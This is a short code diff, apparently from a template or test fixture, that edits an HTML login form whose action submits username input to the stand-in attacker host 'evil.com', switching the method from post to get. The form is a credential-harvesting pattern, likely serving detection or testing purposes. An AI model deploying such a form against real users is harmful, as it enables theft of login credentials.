@@ -8,7 +8,7 @@ info:
     
     <h2 style="text-align: center;">Login</h2>
 
-    <form action="//evil.com" method="post">
+    <form action="//evil.com" method="get">
       <label>Username</label><br>
       <input type="text" style="width: 100%; padding: 8px; margin: 5px 0 15px 0;"><br>
 
